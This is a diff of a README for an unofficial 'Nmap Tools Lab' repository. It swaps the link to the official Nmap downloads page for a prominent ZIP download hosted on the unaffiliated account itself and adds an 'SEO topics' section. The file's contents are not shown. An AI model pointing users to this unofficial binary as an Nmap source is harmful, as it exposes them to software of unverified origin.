@@ -1,20 +1,29 @@
-# Nmap Tools Lab
+# Nmap Network Mapper — Landing Page
 
-Independent documentation and discovery resources for authorized network inventory and diagnostics.
+<div align="center">
 
-## Nmap Network Mapper
+![Nmap Tools Lab](https://img.shields.io/badge/Nmap%20Tools%20Lab-independent%20resource-0d8c96?style=for-the-badge)
+![Pages](https://img.shields.io/badge/GitHub%20Pages-live-2ea44f?logo=github)
+![Use](https://img.shields.io/badge/use-authorized%20testing-2563eb)
 
-Nmap is an open-source utility for network discovery, service detection, and security auditing on systems you are authorized to test.
+**A polished, independent starting point for Nmap documentation, downloads, and responsible network discovery.**
 
-- [Official Nmap downloads](https://nmap.org/download.html)
-- [Official Nmap documentation](https://nmap.org/book/man.html)
-- [Nmap source code](https://github.com/nmap/nmap)
-- [Nmap landing page](https://nmap-tools-lab.github.io/nmap-site/)
+[Open landing page](https://nmap-tools-lab.github.io/nmap-site/) · [Download ZIP](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip) · [Official Nmap site](https://nmap.org/)
 
-### Responsible use
+</div>
 
-Use Nmap only on networks and systems where you have explicit permission. This account is an independent community resource and is not affiliated with or endorsed by the Nmap Project.
+## Included
 
-## Topics
+- Nmap Network Mapper overview
+- Official documentation and source links
+- Original ZIP download with Release history and SHA-256 reference
+- Authorized-use guidance for administrators, engineers, and security teams
+- Responsive layout with accessible CTA buttons and hover states
+
+## Responsible use
+
+This is an independent community resource, not an official Nmap Project account. Use Nmap only on systems and networks where you have explicit authorization.
+
+## SEO topics
 
 `nmap` · `network-discovery` · `port-scanning` · `service-detection` · `network-security` · `system-administration` · `authorized-testing`
